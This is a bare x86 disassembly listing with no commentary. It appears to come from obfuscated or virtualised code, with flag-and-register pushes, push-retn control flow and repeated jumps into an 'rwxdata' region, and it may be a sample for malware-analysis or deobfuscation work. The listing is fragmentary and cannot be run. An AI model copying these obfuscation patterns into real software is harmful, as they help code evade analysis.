mov [ esp + 0x20 ] ecx
jmp rwxdata
mov [ esp ] 0xd1
push 0xc7af53ff
jmp rwxdata
mov [ esp + 0x20 ] edx
pushad
call sub_5116b8
sub_512f74
mov [ esp + 0x4 ] eax
jmp sub_513319
sub_513068
call sub_511eb9
sub_5130f4
mov [ esp ] eax
pushfd
pop [ esp + 0x40 ]
call sub_5115ba
sub_513208
mov [ esp + 0xc ] eax
mov [ esp + 0x4 ] 0xdc6d407b
push 0xaa8a8559
push [ esp ]
push [ esp + 0x14 ]
retn 0x18
sub_5132fa
pushfd
pop [ esp ]
jmp sub_5134c7
j_sub_5115d3
jmp sub_5115d3
sub_5133c2
mov [ esp + 0x4 ] eax
pushad
mov [ esp + 0x20 ] esi
mov [ esp ] bl
call sub_511e2b
pushfd
pushad
mov [ esp + 0x8 ] sp
mov [ esp + 0x20 ] ecx
call sub_512539
sub_5133e3
call sub_51246a
call sub_511d17
sub_51342d
call sub_511498
sub_513432
stc
sub ebp 0x2
jmp sub_511dcc
sub_5134be
pushfd
pop [ esp ]
jmp sub_513bcb
sub_51355e
pushfd
jmp rwxdata
call sub_511e7e
sub_51364c
mov [ esp + 0x48 ] edx
jmp sub_5117db
sub_5136fa
pushfd
pop [ esp + 0x44 ]
jmp sub_513fe8
sub_513704
push [ esp + 0x4 ]
mov [ esp + 0x34 ] ebx
jmp rwxdata
jmp rwxdata
push [ rwxdata ]
pop [ esp + 0x30 ]
call sub_513131
sub_513725
mov [ esp + 0x54 ] ebx
jmp j_sub_51420a
sub_513798
push [ esp + 0x8 ]
jmp rwxdata
mov [ esp + 0x18 ] ecx
call sub_51209a
pushad
push esi
mov [ esp + 0x28 ] eax
call sub_513304
j_sub_514146
jmp sub_514146
sub_5139c0
call sub_512bc2
mov [ esp ] 0xb3
mov [ esp + 0x24 ] edi
call sub_51219e
sub_513b8a
pushfd
mov [ esp ] 0x7a
mov [ esp + 0x2c ] edx
mov [ esp ] 0x7b
jmp rwxdata
pushfd
pop [ esp + 0x28 ]
jmp rwxdata
mov [ esp + 0x24 ] ebx
call sub_512220
sub_513bc6
call sub_51173e
sub_513c1c
pushfd
mov [ esp + 0x34 ] ebx
call sub_512161
push 0x58a04c24
pushfd
pop [ esp + 0x38 ]
call sub_51355e
sub_513c36
mov eax [ fs : eax ]
call sub_512c1a
sub_513d6a
call sub_511d3c
pushad
pushad
mov [ esp + 0x3c ] ecx
jmp rwxdata
pushfd
mov [ esp + 0x3c ] ebp
call sub_51137f
sub_513d7f
call j_sub_512f74
sub_513df1
mov [ esp + 0x8 ] 0x50
mov [ esp + 0x30 ] esi
call sub_512d94
sub_513dff
mov [ esp ] cl
mov [ esp + 0x48 ] ebx
jmp sub_511416
j_sub_513b8a
jmp sub_513b8a
sub_513f13
mov [ esp ] ebx
jmp sub_51372e
j_sub_512091
jmp j_sub_512091#2
j_sub_5116d6
jmp sub_5116d6
sub_514103
dec al
ror edx cl
shl dx cl
xor al 0xb
shld dx bp 0xf
bt edx 0x5
xor bl al
sar dx cl
mov edx [ eax + edi ]
jmp sub_512082
sub_514287
call sub_512072
pop ebp
not ch
pop ecx
pushfd
pushfd
pushad
push [ esp + 0x28 ]
retn 0x2c
j_sub_5117fc
jmp sub_5117fc
